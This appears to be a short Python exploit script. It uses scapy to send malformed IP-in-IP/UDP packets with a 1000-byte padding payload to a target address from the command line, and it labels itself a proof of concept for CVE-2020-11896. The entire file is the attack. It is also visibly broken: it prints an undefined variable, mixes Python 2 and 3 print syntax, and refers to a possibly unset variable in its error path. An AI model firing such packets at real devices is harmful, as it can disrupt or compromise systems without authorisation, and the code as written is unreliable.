import sys
try:
    from scapy.all import *
except Exception as e:
    print ("[*] You need install scapy first:\n[*] sudo pip install scapy ")
if __name__ == '__main__':
    try:
        address = sys.argv[1]
        i = 0
        print ("[*] Trying CVE-2020-11896.PoC for" + check_ip)
        #for i in range(0,10):
        #while True:
        send(IP(dst=address,proto=4,id=0xabcd)/IP(dst=address,len=32,proto=17)/UDP(dport=68,chksum=0,len=12)/("A"*1000),inter=2,count=3)
        print ("[*] Check Over!! ")
    except Exception as e:
        print "[*] usage: sudo python exp.py " + address
